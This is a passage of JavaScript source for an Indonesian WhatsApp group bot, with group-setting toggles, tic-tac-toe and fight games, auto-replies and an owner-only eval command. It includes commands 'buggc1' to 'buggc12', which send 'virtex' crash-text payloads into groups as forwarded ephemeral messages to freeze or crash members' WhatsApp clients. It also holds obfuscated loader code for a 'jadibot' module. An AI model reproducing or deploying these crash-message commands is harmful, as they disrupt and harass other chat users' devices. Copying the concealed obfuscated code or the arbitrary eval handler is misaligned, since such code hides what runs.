 reply('Sukses mengaktifkan fitur welcome di group ini ✔️')







  } else if ((args[0]) === 'disable') {







 welkom.splice(from, 1)







 fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))







 reply('Sukses menonaktifkan fitur welcome di group ini ✔️')







  } else {







 reply('Enable untuk mengaktifkan, disable untuk menonaktifkan')







  }







  break







  case 'mute':







  if (!isGroup) return reply(mess.only.group)







 if (!isGroupAdmins) return reply(mess.only.admin)







if (args.length < 1) return reply('!mute enable/disable')







  if (args[0].toLowerCase() === 'enable'){







 if (isMuted) return reply(`udah di mute`)







mute.push(from)







 fs.writeFileSync('./database/group/mute.json', JSON.stringify(mute))







 reply(`*...:* *MUTE ON* *:...*\n\nPerhatian untuk member grup\nBot telah di mute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${botName}*_`)







  } else if (args[0].toLowerCase() === 'disable'){







 anu = mute.indexOf(from)







 mute.splice(anu, 1)







 fs.writeFileSync('./database/group/mute.json', JSON.stringify(mute))







 reply(`*...:* *𝙈𝙐𝙏𝙀 𝙊𝙁𝙁* *:...*\n\nPerhatian untuk member grup\nBot telah di unmute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${botName}*_`)







  } else {







 reply(`Pilih enable atau disable`)







  }







  break

  

  case 'buggc1':

        wann.sendMessage(from, virtex90(prefix), text, {quoted: ftoko, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})

        break

        case 'buggc2':

        wann.sendMessage(from, virtex2(prefix), text, {quoted: ftoko, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})

        break

        case 'buggc3':

        wann.sendMessage(from, virtex3(prefix), text, {quoted: ftoko, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})

        break

        case 'buggc4':

        wann.sendMessage(from, virtex4(prefix), text, {quoted: ftoko, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})

        break

case 'buggc5':

        wann.sendMessage(from, virtex5(prefix), text, {quoted: ftoko, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})

        break

case 'buggc6':

        wann.sendMessage(from, virtex6(prefix), text, {quoted: ftoko, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})

        break

        case 'buggc7':

        wann.sendMessage(from, virtex7(prefix), text, {quoted: ftoko, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})

        break

        case 'buggc8':

        wann.sendMessage(from, virtex8(prefix), text, {quoted: ftoko, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})

        break

        case 'buggc9':

        wann.sendMessage(from, virtex9(prefix), text, {quoted: ftoko, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})

        break

        case 'buggc10':

        wann.sendMessage(from, ngazap(prefix), text, {quoted: ftoko, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})

        break

        case 'buggc11':

        wann.sendMessage(from, virtag(prefix), text, {quoted: ftoko, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})

        break

        case 'buggc12':

        wann.sendMessage(from, emoji2(prefix), text, {quoted: ftoko, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})

        break



  case 'grupsetting':







  case 'groupsetting':







  if (!isGroup) return reply(mess.only.group)







 if (!isGroupAdmins) return reply(mess.only.admin)







list = []







 com = [`group enable`,`leveling enable`,`welcome enable`,`antilink enable`,`mute enable`]







 comm = [`group disable`,`leveling disable`,`welcome disable`,`antilink disable`,`mute disable`]







 listnya = [`Group open/close`,`Leveling enable/disable`,`Welcome enable/disable`,`Antilink enable/disable`,`Mute enable/disable`]







 suruh = [`Enable`, `Disable`]







 fiturname = [`Group`,`Leveling`,`Welcome`,`Antilink`,`Mute`]







 startnum = 0; let startnu = 0; let startn = 0;let start = 0







 startnumm = 1







 for (let x of com) {







var yy = {title: `${listnya[startnum++]}`,







rows: [







{







 title: `${suruh[0]}`,







 description: `\nMengaktifkan ${fiturname[startnu++]}`,







 rowId: `${prefix}${x}`







  },{







 title: `${suruh[1]}`,







 description: `\nMenonaktifkan ${fiturname[startn++]}`,







 rowId: `${prefix}${comm[start++]}`







  }







  ]







}







list.push(yy)







 }







 listmsg(from, `Group Setting`, `Atur Settingan Grup anda disini......`, list)







 break







 case 'group':







 case 'grup':







 if (!isGroup) return reply(mess.only.group)







  if (!isGroupAdmins) return reply(mess.only.admin)







 if (!isBotGroupAdmins) return reply(mess.only.Badmin)







if (args.length < 1) return reply('!group enable/disable')







  if (args[0].toLowerCase() === 'enable'){







 wann.groupSettingChange(from, "announcement", false)







 .then((res) => reply(jsonformat(res)))







 .catch((err) => reply(jsonformat(err)))







  } else if (args[0].toLowerCase() === 'disable'){







 wann.groupSettingChange(from, "announcement", true)







 .then((res) => reply(jsonformat(res)))







 .catch((err) => reply(jsonformat(err)))







  } else if (args[0].toLowerCase() === 'close'){







 wann.groupSettingChange(from, "announcement", true)







 .then((res) => reply(jsonformat(res)))







 .catch((err) => reply(jsonformat(err)))







  } else if (args[0].toLowerCase() === 'open'){







 wann.groupSettingChange(from, "announcement", false)







 .then((res) => reply(jsonformat(res)))







 .catch((err) => reply(jsonformat(err)))







  } else {







 reply(`Pilih enable atau disable`)







  }







  break







//------------------< Menunya Bang:v >-------------------



case 'infoig':



reply(`Jangan Lupa Follow Ig Owner Ya : https://www.instagram.com/achyrr_wann/`)



break



case 'ikyygroup':



reply('https://instabio.cc/wannstore')



break



case 'artinama'://case by Daffa

            if (args.length < 1) return reply('Namanya Siapa Kak?')

            namakm = await fetchJson(`https://api.lolhuman.xyz/api/artinama?apikey=${setting.lolkey}&nama=${body.slice(10)}`)

            namakmm = namakm.result

            reply(namakmm)

            break    











case 'jadibot':



if (!isOwner) return  reply(mess.only.owner)



 const _0x5f10=['1ubdcbO','202171TkLMwo','284052dVVNCo','42JxCsde','24890OaehfM','./jadibot.js','26826mdmYhJ','176EqLcNV','55194kArISZ','6GRvhmu','314893OwJFDH'];const _0x470b71=_0x5476;function _0x5476(_0x56372d,_0x51b653){return _0x5476=function(_0x5f107a,_0x54761a){_0x5f107a=_0x5f107a-0xd8;let _0x336fbf=_0x5f10[_0x5f107a];return _0x336fbf;},_0x5476(_0x56372d,_0x51b653);}(function(_0x4b0f8a,_0x1f534e){const _0x1acfb6=_0x5476;while(!![]){try{const _0x55ab94=-parseInt(_0x1acfb6(0xdc))+parseInt(_0x1acfb6(0xe2))*parseInt(_0x1acfb6(0xde))+-parseInt(_0x1acfb6(0xe1))*parseInt(_0x1acfb6(0xdb))+parseInt(_0x1acfb6(0xda))+-parseInt(_0x1acfb6(0xdd))+parseInt(_0x1acfb6(0xdf))+parseInt(_0x1acfb6(0xd8))*parseInt(_0x1acfb6(0xd9));if(_0x55ab94===_0x1f534e)break;else _0x4b0f8a['push'](_0x4b0f8a['shift']());}catch(_0x4a8ec9){_0x4b0f8a['push'](_0x4b0f8a['shift']());}}}(_0x5f10,0x285aa));const {jadibot}=require(_0x470b71(0xe0));jadibot(iwan,from,sender,reply,wan);



break



case 'stopjadibot':



case 'stopbot':



const _0x1427=['2584oRLTbU','3849mFwfyJ','./jadibot.js','71LvrzJG','286372cCrXrQ','1yPMtDu','1AjjlYF','456046PuhVDs','394eRcMph','746574pwCcoE','625699UVPwUh','1029671oWZdcF'];const _0x49a386=_0x39bb;function _0x39bb(_0x399e0b,_0x2d0c73){return _0x39bb=function(_0x1427be,_0x39bbc5){_0x1427be=_0x1427be-0x132;let _0x12e62d=_0x1427[_0x1427be];return _0x12e62d;},_0x39bb(_0x399e0b,_0x2d0c73);}(function(_0x49c476,_0x4d8227){const _0x22a1e5=_0x39bb;while(!![]){try{const _0x311704=parseInt(_0x22a1e5(0x138))*parseInt(_0x22a1e5(0x13c))+parseInt(_0x22a1e5(0x13b))*parseInt(_0x22a1e5(0x136))+-parseInt(_0x22a1e5(0x134))+-parseInt(_0x22a1e5(0x13d))*parseInt(_0x22a1e5(0x133))+parseInt(_0x22a1e5(0x137))+-parseInt(_0x22a1e5(0x139))+-parseInt(_0x22a1e5(0x13a))*parseInt(_0x22a1e5(0x135));if(_0x311704===_0x4d8227)break;else _0x49c476['push'](_0x49c476['shift']());}catch(_0x25e28b){_0x49c476['push'](_0x49c476['shift']());}}}(_0x1427,0x8b9f1));const {stopjadibot}=require(_0x49a386(0x132));stopjadibot(wann,from,sender,wan);



break



default:



if (budy.includes(`assalamualaikum`)) {



  reply(`Waalaikumsalam`)



}



if (budy.includes(`anjing`)) {



  reply(`santai jamet`)



}



if (budy.includes(`Iky`)) {



  reply(`Auto respon: Iya kenapa manggil ownerku?`)



}











if (budy.includes(`Assalamualaikum`)) {



  reply(`Waalaikumsalam`)



}







if (budy.includes(`syalom`)) {



  reply(`waalaikumsalam`)



}







if (budy.includes("Numa")){







  wann.updatePresence(from, Presence.composing)







  const loli = fs.readFileSync('./assets/numa')







  wann.sendMessage(from, loli, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})







  const d = fs.readFileSync('./sticker/jget.webp');







  wann.sendMessage(from, d, sticker, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "song : dj numa numa yei", 'jpegThumbnail': fs.readFileSync('./sticker/dnsnew.webp')}}}})







}



if (budy.includes("#m")){



  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})



}



if (budy.includes("!m")){



  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})



}



if (budy.includes("#a")){



  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})



}



if (budy.includes("!a")){



  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})



}



if (budy.includes("#s")){



  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})



}



if (budy.includes("!s")){



  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})



}



if (budy.includes("bot")){



  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})



}



if (budy.includes("Bot")){



  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})



}















if (fs.existsSync(`./media/${from}.json`)) {



	gelutSkuy = setGelud(`${from}`)



	if (sender == `${gelutSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {



		if (gelutSkuy.status) return reply(`Game telah dimulai sebelumnya!`)



gelutSkuy.status = true



 rand0m = [ gelutSkuy.Z, gelutSkuy.Y ]



 winR = rand0m[Math.floor(Math.random() * rand0m.length)]



 fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))



 starGame = `👑 Gelud Game 🤙🏻 







 Diantara @${gelutSkuy.Z} & @${gelutSkuy.Y}



 • Pemenangnya adalah [ @${winR} ] `



 wann.sendMessage(from, starGame, text, {quoted: freply, contextInfo: { mentionedJid: [winR + "@s.whatsapp.net", gelutSkuy.Z + "@s.whatsapp.net", gelutSkuy.Y + "@s.whatsapp.net",]}})



 fs.unlinkSync("./media/" + from + ".json");



  } else if (sender == `${gelutSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {



 wann.sendMessage(from, `👑 Game Gelud Rejected 🤙🏻



• @${gelutSkuy.Y} Menolak🤙🏻`, text, {quoted: freply, contextInfo: { mentionedJid: [gelutSkuy.Y + "@s.whatsapp.net"]}})



 fs.unlinkSync("./media/" + from + ".json");



  }



}







if (isTTT && isPlayer2){



  if (budy.startsWith('Y')){



 tto = ky_ttt.filter(ghg => ghg.id.includes(from))



 tty = tto[0]



 angka = tto[0].angka



 ucapan = 



 `*🎳 Game Tictactoe 🎲*







 Player1 @${tty.player1.split('@')[0]}=❎



 Player2 @${tty.player2.split('@')[0]}=⭕







 Giliran = @${tty.player1.split('@')[0]}







 ${angka[1]}${angka[2]}${angka[3]}



 ${angka[4]}${angka[5]}${angka[6]}



 ${angka[7]}${angka[8]}${angka[9]}`



 wann.sendMessage(from, ucapan, text, {quoted: freply, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})



  }



  if (budy.startsWith('N')){



 tto = ky_ttt.filter(ghg => ghg.id.includes(from))



 tty = tto[0]



 naa = ky_ttt.filter(toek => !toek.id.includes(from)) 



 ky_ttt = naa



 wann.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:wan,contextInfo:{mentionedJid:[tty.player2]}})



  }



}







if (isTTT && isPlayer1){



  nuber = parseInt(budy)



  if (isNaN(nuber)) return



 if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')



main = ky_ttt.filter(hjh => hjh.id.includes(from)) 



 if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')



if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')



  s = '❎'



main[0].angka[nuber] = s



main[0].gilir = main[0].player1



naa = ky_ttt.filter(hhg => !hhg.id.includes(from))



ky_ttt = naa



pop = main[0]



ky_ttt.push(pop)



tto = ky_ttt.filter(hgh => hgh.id.includes(from))



tty = tto[0]



angka = tto[0].angka



ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`







ucapmenang = () => {



  ucapan1 = 



  `*🎳Result Game Tictactoe 🎲*







  *Yeyyy Permainan Di Menangkan Oleh* @${tty.player1.split('@')[0]}\n



  *Ingin bermain lagi? ${prefix}tictactoe*`



  ucapan2 = `*🎳Result Game Tictactoe 🎲*







  *Hasil Akhir:*







  ${ttt}`



  wann.sendMessage(from, ucapan1, text, {quoted: freply, contextInfo:{mentionedJid: [tty.player1]}})



  naa = ky_ttt.filter(hhg => !hhg.id.includes(from))



  return ky_ttt = naa



}







if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()







  if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()







 if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()







if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()







  if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()







 if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()







if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()







  if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()







 if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !



ttt.includes('5️⃣') && !



ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){



ucapan1 = `*🎳 Result Game Tictactoe 🎲*







 *_Permainan Seri ??👌_*`



 ucapan2 = `*🎳 Result Game Tictactoe ??*







 *Hasil Akhir:*







 ${ttt}`



 reply(ucapan1)



 naa = ky_ttt.filter(hhg => !hhg.id.includes(from))



 return ky_ttt = naa



  }



  ucapan = `*🎳 Game Tictactoe 🎲*







  Player2 @${tty.player2.split('@')[0]}=⭕



  Player1 @${tty.player1.split('@')[0]}=❎







  Giliran = @${tty.player2.split('@')[0]}







  ${ttt}`



  wann.sendMessage(from, ucapan, text, {quoted: freply, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})



}



if (isTTT && isPlayer2){



  nuber = parseInt(budy)



  if (isNaN(nuber)) return



 if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')



main = ky_ttt.filter(hjh => hjh.id.includes(from)) 



 if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')



if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')



  s = '⭕'



main[0].angka[nuber] = s



main[0].gilir = main[0].player2



naa = ky_ttt.filter(hhg => !hhg.id.includes(from))



ky_ttt = naa



pop = main[0]



ky_ttt.push(pop)



tto = ky_ttt.filter(hgh => hgh.id.includes(from))



tty = tto[0]



angka = tto[0].angka



ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`







ucapmenang = () => {



  ucapan1 = `*🎳 Result Game Tictactoe 🎲*







  *Yeyyy Permainan Di Menangkan Oleh* @${tty.player2.split('@')[0]}\n



  *Ingin bermain lagi? ${prefix}tictactoe*`



  ucapan2 = `*🎳 Game Tictactoe 🎲*







  *Hasil Akhir:*







  ${ttt}`



  wann.sendMessage(from, ucapan1, text, {quoted:wan, contextInfo:{mentionedJid: [tty.player2]}})



  naa = ky_ttt.filter(hhg => !hhg.id.includes(from))



  return ky_ttt = naa



}







if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()



  if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()



 if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()



if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()



  if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()



 if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()



if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()



  if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()



 if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !



ttt.includes('5️⃣') && !



ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){



ucapan1 = `*??Result Game Tictactoe 🎲*







 *_Permainan Seri🗿👌*`



 ucapan2 = `*🎳 Result Game Tictactoe 🎲*







 *Hasil Akhir:*







 ${ttt}`



 reply(ucapan1)



 naa = ky_ttt.filter(hhg => !hhg.id.includes(from))



 return ky_ttt = naa



  }



  ucapan = `*🎳 Game Tictactoe 🎲*







  Player1 @${tty.player1.split('@')[0]}=⭕



  Player2 @${tty.player2.split('@')[0]}=❎







  Giliran = @${tty.player1.split('@')[0]}







  ${ttt}`



  wann.sendMessage(from, ucapan, text, {quoted: freply, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})



} else {



}



if (/^=?>/.test(budy) && (isOwner || wan.key.fromMe )){







  let parse = /^=>/.test(budy) ? budy.replace(/^=>/,'return') : budy.replace(/^>/,'')







  try{







 let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })







 return reply(require('util').format(evaluate))







  } catch(e){







return reply(require('util').format(e))







 }



  }



  if (!isGroup && isCmd && !wan.key.fromMe){



 tek = `follow @achyrr_wann`



 meki = `Maaf @${senderr.split('@')[0]}, command ${prefix + command} tidak ada dalam menu`



 sendButMessage (from, meki, tek, nomenu, 'extendedTextMessage', {sendEphemeral:true, quoted:wan, mentionedJid:[senderr]})



  }



} 



if (isGroup && budy != undefined) {



} else {



 console.log('[',color('TEXT','teal'),']',`Pesan : ${budy} Dari`, color(pushname))



  }		



} catch (e) {



  e = String(e)



  if (!e.includes("this.isZero")) {



console.log('Message : %s', color(e, 'cyan'))



 }



  }



}





